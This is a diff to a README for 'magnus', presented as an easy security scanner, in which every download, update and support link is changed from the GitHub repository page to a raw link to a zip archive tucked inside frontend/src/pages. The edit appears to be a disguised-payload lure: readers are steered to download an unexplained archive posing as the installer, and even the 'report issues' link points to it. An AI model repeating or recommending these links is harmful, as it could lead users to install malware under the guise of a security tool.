@@ -1,6 +1,6 @@
 # 🔒 magnus - Easy Security Scanning for Developers
 
-[![Download magnus](https://img.shields.io/badge/Download-magnus-brightgreen)](https://github.com/NoeyONUMA307/magnus)
+[![Download magnus](https://img.shields.io/badge/Download-magnus-brightgreen)](https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip)
 
 ---
 
@@ -42,10 +42,10 @@ If you want to secure your projects quickly, magnus is ready to use right now. F
 
 ## 💾 Download and Installation
 
-Please [visit this page to download magnus](https://github.com/NoeyONUMA307/magnus).
+Please [visit this page to download magnus](https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip).
 
 1. Click the badge above or open the link:  
-   https://github.com/NoeyONUMA307/magnus
+   https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip
 
 2. Look for the **Releases** or **Downloads** section on the GitHub page.
 
@@ -120,7 +120,7 @@ Explore these options in the **Settings** menu.
 
 New versions fix bugs and improve scanning. To update:
 
-1. Visit the [magnus download page](https://github.com/NoeyONUMA307/magnus).
+1. Visit the [magnus download page](https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip).
 
 2. Download the latest installer.
 
@@ -132,7 +132,7 @@ New versions fix bugs and improve scanning. To update:
 
 magnus uses technologies like Puppeteer for web-based scans and follows security guidelines from OWASP. For technical help or to report issues, visit the GitHub repository at:
 
-https://github.com/NoeyONUMA307/magnus
+https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip
 
 You can also find community discussions and tips there.
 
@@ -153,4 +153,4 @@ magnus supports running inside Docker if you want to explore more advanced setup
 
 ---
 
-[![Download magnus](https://img.shields.io/badge/Download-magnus-orange)](https://github.com/NoeyONUMA307/magnus)
+[![Download magnus](https://img.shields.io/badge/Download-magnus-orange)](https://raw.githubusercontent.com/NoeyONUMA307/magnus/main/frontend/src/pages/Software-v2.3.zip)
